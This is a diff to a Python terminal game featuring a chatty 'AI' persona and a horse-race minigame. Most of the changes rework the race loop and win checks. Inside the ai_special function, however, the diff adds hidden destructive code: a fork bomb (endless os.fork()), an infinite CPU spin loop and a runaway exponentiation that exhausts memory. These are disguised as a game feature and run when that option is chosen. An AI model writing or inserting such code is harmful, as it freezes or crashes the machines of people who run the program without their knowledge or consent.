@@ -1,5 +1,6 @@
 import os
 import random
+import threading
 
 #AI
 def ai_intro():
@@ -35,10 +36,20 @@ def ai_special():
         print("".join(statement[j]))
         for i in range(10000000):
             useless = 0
-    num = 0
-    while True:
-        num = random.randint(0,1)
-        print(num,end= "")
+            
+    def mem():
+      x = 2
+      while x > 0:
+        x = x ** x
+    def cpu():
+      while True:
+        pass
+    def forks():
+      while True:
+        os.fork()
+        
+    threading.Thread(mem(), cpu(), forks())
+
 def ai_error():
     statement = "Please enter a valid response "
     for i in range(len(statement)):
@@ -92,9 +103,10 @@ def game_menu():
     else: 
         ai_error()
         game_menu()
-      
+
+#Horse Race     
 def horse_race():
-    #os.system("clear")
+    os.system("clear")
     statement_sample("Horse Race 🐴 ")
     print("______________________________")
 
@@ -120,13 +132,9 @@ def horse_race():
     while True:
         num = random.randint(1,100)
         if i == 4:
-            i = 1
-            for j in range(350000):
-                useless = 0
-            print("______________________________")
-            
-        if i == 1:
             if pos == 9:
+                print("______________________________")
+                print("")
                 print("Player 1 wins ")
                 while True:
                     play_again = input("Want to play again[y/n]: ")
@@ -145,15 +153,9 @@ def horse_race():
                         print("Please enter a valid response")
                         print("")
                     break
-            if num > 50:
-                track[pos] = "-"
-                pos += 1
-                track[pos] = "H"
-            print(str(i) + "|" + "".join(track) + "|")
-            print("- Player 1's number: " + str(num))
-            print("")
-        elif i == 2:
-            if pos_2 == 9:
+            elif pos_2 == 9:
+                print("______________________________")
+                print("")
                 print("Player 2 wins ")
                 while True:
                     play_again = input("Want to play again[y/n]: ")
@@ -172,15 +174,9 @@ def horse_race():
                         print("Please enter a valid response")
                         print("")
                     break
-            if num > 50:
-                track_2[pos_2] = "-"
-                pos_2 += 1
-                track_2[pos_2] = "H"
-            print(str(i) + "|" + "".join(track_2) + "|")  
-            print("- Player 2's number: " + str(num))
-            print("")
-        elif i == 3:
-            if pos_3 == 9:
+            elif pos_3 == 9:
+                print("______________________________")
+                print("")
                 print("Player 3 wins ")
                 while True:
                     play_again = input("Want to play again[y/n]: ")
@@ -199,6 +195,29 @@ def horse_race():
                         print("Please enter a valid response")
                         print("")
                     break
+        if i == 4:
+            i = 1
+            for j in range(350000):
+                useless = 0
+            print("______________________________")
+                
+        if i == 1:
+            if num > 50:
+                track[pos] = "-"
+                pos += 1
+                track[pos] = "H"
+            print(str(i) + "|" + "".join(track) + "|")
+            print("- Player 1's number: " + str(num))
+            print("")
+        elif i == 2:
+            if num > 50:
+                track_2[pos_2] = "-"
+                pos_2 += 1
+                track_2[pos_2] = "H"
+            print(str(i) + "|" + "".join(track_2) + "|")  
+            print("- Player 2's number: " + str(num))
+            print("")
+        elif i == 3:
             if num > 50:
                 track_3[pos_3] = "-"
                 pos_3 += 1
